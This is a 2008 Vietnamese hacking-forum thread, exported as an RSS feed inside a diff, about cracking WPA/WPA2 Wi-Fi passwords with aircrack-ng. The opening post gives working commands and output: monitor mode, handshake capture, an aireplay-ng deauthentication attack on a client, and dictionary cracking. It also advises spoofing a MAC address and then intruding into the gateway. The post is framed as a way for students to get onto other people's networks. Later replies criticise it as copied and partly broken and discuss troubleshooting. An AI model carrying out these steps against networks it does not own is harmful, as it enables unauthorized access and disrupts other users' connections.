@@ -1,0 +1,919 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "hướng dẫn chi tiết tấn công một mạng wifi (wireless) "]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "hướng dẫn chi tiết tấn công một mạng wifi (wireless) "]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ ngày nay ở việt nam wireless ngày càng dày đặc , nhưng muốn dùng thì cũng không dễ , nhất là quân sinh viên chúng ta ,bởi vì đa phần được bảo mật bằng wpa2 hay mac adress limit , bài này sẽ giúp bạn crack wpa và cách tấn công mac adress , qua đó bạn biết mạng wifi của bạn bị tấn công như thế nào và có cách phòng chống luôn
+công cụ dùng trong bài : back track 2 live cd . download :remote exploit forum + google
+mac adress của máy tấn công :00:0F:B5:88:AC:82
+mac adress của máy trong mạng wifi :00:0F:B5:FD:FB:C2
+mac adress của acssespoint : 00:14:6C:7E:40:80
+tên của mạng wifi :teddy
+Access point channel: 9
+Wireless interface: ath0
+
+bước 1 : chuyển wireless card qua chế độ monitor
+
+   ifconfig eth0 up
+   iwconfig eth0 mode monitor
+
+   iwconfig 
+
+   lo        no wireless extensions.
+ 
+ wifi0     no wireless extensions.
+ 
+ eth0      no wireless extensions.
+ 
+ ath0      IEEE 802.11g  ESSID:""  Nickname:""
+  <b><u>      Mode:Monitor</u></b>  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   
+        Bit Rate:0 kb/s   Tx-Power:18 dBm   Sensitivity=0/3  
+        Retry:off   RTS thr:off   Fragment thr:off
+        Encryption key:off
+        Power Management:off
+        Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm
+        Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+        Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+bước 2 : run airodum-ng để collect authentical :
+        
+          airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0
+
+            *
+      -c 9 is chanel của network 
+      - -bssid 00:14:6C:7E:40:80 is the access point MAC address.
+      -w psk file sẽ lưu IVs 
+      ath0 is the interface name.
+khi thành công bạn được như sau :
+
+       CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80
+                                                                                                               
+  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+                                                                                                               
+  00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy                           
+                                                                                                               
+  BSSID              STATION            PWR  Lost  Packets  Probes                                             
+                                                                                                                
+  00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116  
+
+
+WPA handshake: 00:14:6C:7E:40:80” ở trên cùng nghĩa là airodump đang collect IVs file.
+
+bây giờ thì ngồi đợi nha ( có khi cả ngày ha ha ha )
+ nhưng cách này sẽ giúp bạn rút ngắn thời gian đợi rất nhiều :
+    run aireplay-ng để tạo ra nhiều thông tin mã hóa hơn :
+
+   aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+   khi thành công :
+     <i>11:09:28  Sending DeAuth to station   -- STMAC: [00:0F:B5:34:30:30]
+</i>
+sau đó là đợi , càng lâu càng tốt nha 
+ cuối cùng run aircrack-ng để crack :
+   aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk.cap 
+   psk.cap là file capture ở trên
+   password.lst : đường dẫn đến file chứa password trong ổ cứng ( có thể là password.txt)
+khi thành công :
+                             Aircrack-ng 0.8
+ 
+ 
+                 [00:00:00] 2 keys tested (37.20 k/s)
+ 
+ 
+                         KEY FOUND! [ 12345678 ]
+ 
+ 
+    Master Key     : CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E 
+                     B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD 
+ 
+    Transcient Key : 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98 
+                     CE 8A 9D A0 FC ED A6 DE 70 84 BA 90 83 7E CD 40 
+                     FF 1D 41 E1 65 17 93 0E 64 32 BF 25 50 D5 4A 5E 
+                     2B 20 90 8C EA 32 15 A6 26 62 93 27 66 66 E0 71 
+ 
+    EAPOL HMAC     : 4E 27 D9 5B 00 91 53 57 88 9C 66 C8 B1 29 D1 CB 
+
+vậy là có thể crack thành công wpa rồi 
+lưu ý nếu bước cuối cùng không ra key thì đừng xóa file psk đi nha , copy cất kỹ đi từ từ crack nha
+
+VỚI MẠNG WIFI BỊ KHÓA MAC THÌ :khi bạn kết nối sẽ không có hiện tượng gì nhưng không kết nối được
+muốn vào mạng thì phải thay mac adress của mình cho giống một trong những máy trong mạng đó :
+bạn có thể đến gần và coi địa chỉ mac của một máy trong mạng lan đó sau đó đổi mac của mình giống với máy đó thì sẽ vào được , sau khi vào được thì cố gắng xâm nhập vào gateway lấy thêm mac
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133316</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133316</link>
+				<pubDate><![CDATA[Thu, 29 May 2008 16:45:28]]> GMT</pubDate>
+				<author><![CDATA[ tranduyninh]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>
+...
+<blockquote>
+tên của mạng wifi :teddy
+Access point channel: 9
+Wireless interface: <font color='orange'>ath0</font>
+&nbsp;
+		</blockquote>
+bước 1 : chuyển wireless card qua chế độ monitor
+
+   ifconfig <font color='orange'>eth0</font> up
+   iwconfig <font color='orange'>eth0</font> mode monitor
+
+   iwconfig 
+   lo        no wireless extensions.
+ wifi0     no wireless extensions.
+ eth0      no wireless extensions.
+ ath0      IEEE 802.11g  ESSID:""  Nickname:""
+...
+&nbsp;
+		</blockquote>
+Hì, trên "ath0" dưới "eth0" rồi.
+
+Bạn nên định dạng bài viết cho đẹp hơn. Cái gì trích thì nên cho vào thẻ [ quote ], mã lệnh thì nên cho vào thẻ [ code ], đoạn nào cần lưu ý thì bôi đậm lên, ...]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133363</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133363</link>
+				<pubDate><![CDATA[Thu, 29 May 2008 21:56:15]]> GMT</pubDate>
+				<author><![CDATA[ quanta]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Ây da, lâu lâu mới thấy 1 bài hay hay, để bữa nào nghịch thử xem sao :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133372</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133372</link>
+				<pubDate><![CDATA[Thu, 29 May 2008 22:55:09]]> GMT</pubDate>
+				<author><![CDATA[ SuperChicken]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Tui thấy cái này hay hơn nè anh em, Nguyên mẫu tiếng Anh của topic này ở link này đây.
+<span class="link"> http://www.aircrack-ng.org/doku.php?id=cracking_wpa</span>
+
+Tutorial: How to Crack WPA/WPA2
+
+Version: 1.15.1 May 9, 2008
+By: darkAudax
+
+
+<blockquote>Introduction
+
+This tutorial walks you through cracking WPA/WPA2 networks which use pre-shared keys. I recommend you do some background reading to better understand what WPA/WPA2 is. The Wiki links page has a WPA/WPA2 section. he best document describing WPA is Wi-Fi Security - WEP, WPA and WPA2. This is the link to download the PDF directly. The WPA Packet Capture Explained tutorial is a companion to this tutorial.
+
+WPA/WPA2 supports many types of authentication beyond pre-shared keys. aircrack-ng can ONLY crack pre-shared keys. So make sure airodump-ng shows the network as having the authentication type of PSK, otherwise, don't bother trying to crack it.
+
+There is another important difference between cracking WPA/WPA2 and WEP. This is the approach used to crack the WPA/WPA2 pre-shared key. Unlike WEP, where statistical methods can be used to speed up the cracking process, only plain brute force techniques can be used against WPA/WPA2. That is, because the key is not static, so collecting IVs like when cracking WEP encryption, does not speed up the attack. The only thing that does give the information to start an attack is the handshake between client and AP. Handshaking is done when the client connects to the network. Although not absolutely true, for the purposes of this tutorial, consider it true. Since the pre-shared key can be from 8 to 63 characters in length, it effectively becomes impossible to crack the pre-shared key.
+
+The only time you can crack the pre-shared key is if it is a dictionary word or relatively short in length. Conversely, if you want to have an unbreakable wireless network at home, use WPA/WPA2 and a 63 character password composed of random characters including special symbols.
+
+The impact of having to use a brute force approach is substantial. Because it is very compute intensive, a computer can only test 50 to 300 possible keys per second depending on the computer CPU. It can take hours, if not days, to crunch through a large dictionary. If you are thinking about generating your own password list to cover all the permutations and combinations of characters and special symbols, check out this brute force time calculator first. You will be very surprised at how much time is required.
+
+There is no difference between cracking WPA or WPA2 networks. The authentication methodology is basically the same between them. So the techniques you use are identical.
+
+It is recommended that you experiment with your home wireless access point to get familiar with these ideas and techniques. If you do not own a particular access point, please remember to get permission from the owner prior to playing with it.
+
+I would like to acknowledge and thank the Aircrack-ng team for producing such a great robust tool.
+
+Please send me any constructive feedback, positive or negative. Additional troubleshooting ideas and tips are especially welcome.
+
+Assumptions
+
+First, this solution assumes:
+
+    *
+      You are using drivers patched for injection. Use the injection test to confirm your card can inject.
+    *
+      You are physically close enough to send and receive access point and wireless client packets. Remember that just because you can receive packets from them does not mean you may will be able to transmit packets to them. The wireless card strength is typically less then the AP strength. So you have to be physically close enough for your transmitted packets to reach and be received by both the AP and the wireless client. You can confirm that you can communicate with the specific AP by following these instructions.
+    *
+      You are using v0.9.1 or above of aircrack-ng. If you use a different version then some of the command options may have to be changed.
+
+Ensure all of the above assumptions are true, otherwise the advice that follows will not work. In the examples below, you will need to change “ath0” to the interface name which is specific to your wireless card.
+Equipment used
+
+To follow this tutorial at home, you must have two wireless cards.
+
+<font color='yellow'>In this tutorial, here is what was used:
+
+    *
+      MAC address of PC running aircrack-ng suite: 00:0F:B5:88:AC:82
+    *
+      MAC address of the wireless client using WPA2: 00:0F:B5:FD:FB:C2
+    *
+      BSSID (MAC address of access point): 00:14:6C:7E:40:80
+    *
+      ESSID (Wireless network name): teddy
+    *
+      Access point channel: 9
+    *
+      Wireless interface: ath0</font>
+
+You should gather the equivalent information for the network you will be working on. Then just change the values in the examples below to the specific network.
+..........
+&nbsp;
+		</blockquote>
+
+<p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>ngày nay ở việt nam wireless ngày càng dày đặc , nhưng muốn dùng thì cũng không dễ , nhất là quân sinh viên chúng ta ,bởi vì đa phần được bảo mật bằng wpa2 hay mac adress limit , bài này sẽ giúp bạn crack wpa và cách tấn công mac adress , qua đó bạn biết mạng wifi của bạn bị tấn công như thế nào và có cách phòng chống luôn &nbsp;
+		</blockquote>
+
+ :( ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133402</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133402</link>
+				<pubDate><![CDATA[Fri, 30 May 2008 01:54:39]]> GMT</pubDate>
+				<author><![CDATA[ tmd]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Hê hê, em gà món mạng lắm, nhưng sao cái MAC 2 bài giống nhau nhể? ;-), cái này bác copy ở đâu thế, vì công bác dịch thì chắc bác cũng sẽ bỏ thêm chút công đặt các đoạn lệnh vào tag mà. Lộ quá, lộ quá :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133404</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133404</link>
+				<pubDate><![CDATA[Fri, 30 May 2008 02:27:19]]> GMT</pubDate>
+				<author><![CDATA[ nlfb]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ @ tranduyninh: Tui có xem một cái video của nước ngoài. Hình như hướng dẫn này pác dựa theo video đó hả. I xì đúc từ các command, đến cả password "123...8" nữa. Dù sao cũng cảm ơn pác.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133632</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133632</link>
+				<pubDate><![CDATA[Sat, 31 May 2008 20:21:30]]> GMT</pubDate>
+				<author><![CDATA[ lamhoang20002000]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">nlfb wrote:</cite><br>
+		<blockquote>Hê hê, em gà món mạng lắm, nhưng sao cái MAC 2 bài giống nhau nhể? ;-), cái này bác copy ở đâu thế, vì công bác dịch thì chắc bác cũng sẽ bỏ thêm chút công đặt các đoạn lệnh vào tag mà. Lộ quá, lộ quá :D&nbsp;
+		</blockquote>
+ha 
+cái này đúng là copy thật nhưng tiếng anh &gt; tiếng việt cũng  có công ha .
+e rằng trong diễn đàn ít người thích copy từ tiếng anh sang tiếng việt lắm .]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133732</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133732</link>
+				<pubDate><![CDATA[Sun, 1 Jun 2008 17:52:25]]> GMT</pubDate>
+				<author><![CDATA[ tranduyninh]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">quanta wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>
+...
+<blockquote>
+tên của mạng wifi :teddy
+Access point channel: 9
+Wireless interface: <font color='orange'>ath0</font>
+&nbsp;
+		</blockquote>
+bước 1 : chuyển wireless card qua chế độ monitor
+
+   ifconfig <font color='orange'>eth0</font> up
+   iwconfig <font color='orange'>eth0</font> mode monitor
+
+   iwconfig 
+   lo        no wireless extensions.
+ wifi0     no wireless extensions.
+ eth0      no wireless extensions.
+ ath0      IEEE 802.11g  ESSID:""  Nickname:""
+...
+&nbsp;
+		</blockquote>
+Hì, trên "ath0" dưới "eth0" rồi.
+
+Bạn nên định dạng bài viết cho đẹp hơn. Cái gì trích thì nên cho vào thẻ [ quote ], mã lệnh thì nên cho vào thẻ [ code ], đoạn nào cần lưu ý thì bôi đậm lên, ...&nbsp;
+		</blockquote>
+cám ơn bro nhắc nhở]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133733</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133733</link>
+				<pubDate><![CDATA[Sun, 1 Jun 2008 17:54:18]]> GMT</pubDate>
+				<author><![CDATA[ tranduyninh]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Nếu không ai nói thì cái công "tự nhận" và "convert sai kỹ thuật" được ém luôn. Lỡ có ai đó không rành kỹ thuật vào coi sẽ hiểu sai vấn đề.
+Nói thẳng ra là ăn cắp bản quyền tác giả.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133745</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133745</link>
+				<pubDate><![CDATA[Sun, 1 Jun 2008 19:20:48]]> GMT</pubDate>
+				<author><![CDATA[ tmd]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Các tut ngon nhất của tây nhiều khi nói vậy nhưng không phải vậy, không thử, không hiểu, thực hiện máy móc theo tut mà được thì tôi chết liền !!!  ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133822</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133822</link>
+				<pubDate><![CDATA[Mon, 2 Jun 2008 12:24:09]]> GMT</pubDate>
+				<author><![CDATA[ eyesdog]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <blockquote>-c 9 is chanel của network &nbsp;
+		</blockquote>
+
+Cái này có phải là translate hôn :-?
+
+<blockquote> bây giờ thì ngồi đợi nha ( có khi cả ngày ha ha ha ) &nbsp;
+		</blockquote>
+
+Thử chưa? Đưa cảm nhận vào à :-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133873</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#133873</link>
+				<pubDate><![CDATA[Mon, 2 Jun 2008 17:56:40]]> GMT</pubDate>
+				<author><![CDATA[ nlfb]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>
+...
+cái này đúng là copy thật nhưng tiếng anh &gt; tiếng việt cũng  có công ha .
+&nbsp;
+		</blockquote>
+Đúng là cũng có công thật. Nhưng, tôi nghĩ như này sẽ hay hơn:
+Từ bài viết đó, bạn nên đọc để hiểu và thực hành trên một môi trường thật, sau đó ghi lại và giải thích các bước chính. Như thế ít ra bạn còn thu được kiến thức gì đó. 
+
+Tôi hỏi bạn vài câu:
+1. Đoạn này của bạn có chạy được không?
+<p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>
+bước 1: chuyển wireless card qua chế độ monitor
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>ifconfig ath0 up
+iwconfig ath0 mode monitor</pre>
+		</div>
+&nbsp;
+		</blockquote>
+<i>(Đã nhắc sửa eth0 thành ath0 nhưng cũng không sửa)</i>
+
+2. Tại sao bạn không dùng <font color='orange'>airmon-ng</font> để chuyển wireless card sang chế độ <b>monitor</b>:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># airmon-ng start ath0</pre>
+		</div>
+
+3. 
+<p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>
+bước 2 : run airodum-ng để collect authentical :
+        
+          <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0</pre>
+		</div>
+            *
+      -c 9 is chanel của network 
+      - -bssid 00:14:6C:7E:40:80 is the access point MAC address.
+      -w psk file sẽ lưu IVs 
+      ath0 is the interface name.
+&nbsp;
+		</blockquote>
+<p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>
+ cuối cùng run aircrack-ng để crack :
+   <span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk.cap</pre>
+		</div> 
+   psk.cap là file capture ở trên
+   password.lst : đường dẫn đến file chứa password trong ổ cứng ( có thể là password.txt)
+&nbsp;
+		</blockquote>
+<i>"psk"</i> là cái gì? Tại sao ở trên chỉ có <b>-w psk</b>, còn ở dưới "file capture" lại là <i>psk.cap</i>?
+
+Tóm lại, tôi có một góp ý là bạn nên "thử" thực hiện bài hướng dẫn này trên môi trường thật. Sau đó sửa lại bài viết, chú ý định dạng cho cẩn thận. Nếu không, tôi đành dời nó vào Trash. Cảm ơn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134090</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134090</link>
+				<pubDate><![CDATA[Wed, 4 Jun 2008 02:05:44]]> GMT</pubDate>
+				<author><![CDATA[ quanta]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Đọc mà hoa cả mắt :-O
+Toàn "core" là "core" thôi à! 
+
+<p></p>
+		<cite class="blockquote">lamhoang20002000 wrote:</cite><br>
+		<blockquote>@ tranduyninh: Tui có xem một cái video của nước ngoài. Hình như hướng dẫn này pác dựa theo video đó hả. I xì đúc từ các command, đến cả password "123...8" nữa. Dù sao cũng cảm ơn pác. &nbsp;
+		</blockquote>
+
+Bác có video hay link thì share lên đi, để anh em tò mò làm gì! :)
+
+PS: Mình nghĩ đây là chủ đề khá hay bác nào có thông tin "hay hay" post lên đây anh em học hỏi với nhé!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134095</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134095</link>
+				<pubDate><![CDATA[Wed, 4 Jun 2008 03:47:45]]> GMT</pubDate>
+				<author><![CDATA[ mco3co]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Hi mới tìm hiểu về wireless. Sẵn tiện cho mình hỏi luôn làm thế nào để biết mạng wifi đó dùng wep hay wpa để mã hóa dữ liệu truyền đi ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134452</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134452</link>
+				<pubDate><![CDATA[Fri, 6 Jun 2008 17:07:43]]> GMT</pubDate>
+				<author><![CDATA[ vikjava]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Để biết mạng wifi có mã hóa hay không, bạn có thể dùng các phần mềm quét (wireless network scanner).
+Một số phần mềm khá phổ biến: NetStumbler (trong Windows), airodump-ng (trong bộ aircrack-ng) ...
+
+Thân]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134455</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134455</link>
+				<pubDate><![CDATA[Fri, 6 Jun 2008 17:20:00]]> GMT</pubDate>
+				<author><![CDATA[ 4hfoo]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">vikjava wrote:</cite><br>
+		<blockquote>Hi mới tìm hiểu về wireless. Sẵn tiện cho mình hỏi luôn làm thế nào để biết mạng wifi đó dùng wep hay wpa để mã hóa dữ liệu truyền đi ?&nbsp;
+		</blockquote>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># iwlist wlan0 scan
+wlan0     Scan completed :
+          Cell 01 - Address: 00:40:96:57:B2:5A
+                    ESSID:""
+                    Mode:Master
+                    Frequency:2.437 GHz &#40;Channel 6&#41;
+                    Channel:6
+                    Quality=33/100  Signal level=-89 dBm  Noise level=-87 dBm
+                    Encryption key:on
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s
+                    Extra:tsf=00000086ec9511d5
+          Cell 02 - Address: 00:01:38:A8:2A:FD
+                    ESSID:""
+                    Mode:Master
+                    Frequency:2.457 GHz &#40;Channel 10&#41;
+                    Channel:10
+                    Quality=81/100  Signal level=-53 dBm  Noise level=-90 dBm
+                    Encryption key:on
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers &#40;2&#41; : TKIP CCMP
+                        Authentication Suites &#40;1&#41; : PSK
+                       Preauthentication Supported
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+                              9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s; 36 Mb/s
+                              48 Mb/s; 54 Mb/s
+                    Extra:tsf=000000196d72a8f8
+          Cell 03 - Address: 00:18:39:EA:EE:AE
+                    ESSID:""
+                    Mode:Master
+                    Frequency:2.462 GHz &#40;Channel 11&#41;
+                    Channel:11
+                    Quality=26/100  Signal level=-93 dBm  Noise level=-86 dBm
+                    Encryption key:on
+                    IE: WPA Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers &#40;1&#41; : TKIP
+                        Authentication Suites &#40;1&#41; : PSK
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s; 6 Mb/s; 9 Mb/s
+                              12 Mb/s; 48 Mb/s
+                    Extra:tsf=00000006bcfb5183
+          Cell 04 - Address: 00:1D:7E:47:1B:D1
+                    ESSID:""
+                    Mode:Master
+                    Frequency:2.462 GHz &#40;Channel 11&#41;
+                    Channel:11
+                    Quality=37/100  Signal level=-87 dBm  Noise level=-86 dBm
+                    Encryption key:on
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+                              12 Mb/s; 24 Mb/s; 36 Mb/s; 9 Mb/s; 18 Mb/s
+                              48 Mb/s; 54 Mb/s
+                    Extra:tsf=00000050e7fb3181</pre>
+		</div>
+Bạn để ý phần <font color='orange'><b>IE:</b></font>
+
+Ngoài ra, bạn có thể dùng NetworkManager, chí vào "Cell" định kết nối, bạn sẽ biết:
+
+<br>
+			<div align="center" class="limitview"><img src='http://i86.photobucket.com/albums/k106/strategistquanta/WirelessNetworkSecretsRequired.png' border="0" onload="maxImg(this, 500px);" /></div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134457</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134457</link>
+				<pubDate><![CDATA[Fri, 6 Jun 2008 17:48:57]]> GMT</pubDate>
+				<author><![CDATA[ quanta]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ cả tuần mới có dịp lên mạng , vào hva thấy bị nhắc nhở buồn quá . cũng lưu ý các bạn là khi mình dùng cách trên với broadcom wireless thì nó cứ trơ ra .]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134609</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134609</link>
+				<pubDate><![CDATA[Sat, 7 Jun 2008 20:21:07]]> GMT</pubDate>
+				<author><![CDATA[ tranduyninh]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>cả tuần mới có dịp lên mạng , vào hva thấy bị nhắc nhở buồn quá . cũng lưu ý các bạn là khi mình dùng cách trên với broadcom wireless thì nó cứ trơ ra .&nbsp;
+		</blockquote>
+Buồn gì, có người nhắc nhở chứng tỏ là có người quan tâm tới bạn.
+<blockquote>Ây da, lâu lâu mới thấy 1 bài hay hay, để bữa nào nghịch thử xem sao&nbsp;
+		</blockquote>
+Nghe câu này thấy không buồn chứ :D
+<blockquote> Tóm lại, tôi có một góp ý là bạn nên "thử" thực hiện bài hướng dẫn này trên môi trường thật. Sau đó sửa lại bài viết, chú ý định dạng cho cẩn thận.&nbsp;
+		</blockquote>
+Bạn nên cảm thấy quý trọng những lời góp ý chân thành như thế này, nó sẽ giúp bạn tiến bộ hơn lên.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134611</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134611</link>
+				<pubDate><![CDATA[Sat, 7 Jun 2008 20:30:55]]> GMT</pubDate>
+				<author><![CDATA[ pnco]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">eyesdog wrote:</cite><br>
+		<blockquote>Các tut ngon nhất của tây nhiều khi nói vậy nhưng không phải vậy, không thử, không hiểu, thực hiện máy móc theo tut mà được thì tôi chết liền !!!  &nbsp;
+		</blockquote>
+Tớ đồng ý với quan điểm này. Chẳng hạn, tớ dùng Fedora 9, cài aircrack-ng bằng yum. Thông tin wireless card như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># lsmod | grep 3945
+iwl3945               145244  0 
+mac80211              185184  1 iwl3945
+cfg80211               24712  2 iwl3945,mac80211</pre>
+		</div>
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># lspci | grep Wireless
+06:00.0 Network controller: Intel Corporation PRO/Wireless 3945ABG Network Connection &#40;rev 02&#41;</pre>
+		</div>
+
+Cài xong, hăm hở thử thực hiện. Ngay bước đầu tiên, chuyển wireless card sang chế độ "monitor" đã gặp ngay lỗi:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre># airmon-ng start wlan0
+
+Interface       Chipset         Driver
+
+wlan0                   iwl3945 - &#91;phy0&#93;/usr/sbin/airmon-ng: line 338: /sys/class/ieee80211/phy0/add_iface: No such file or directory
+mon0: unknown interface: No such device
+
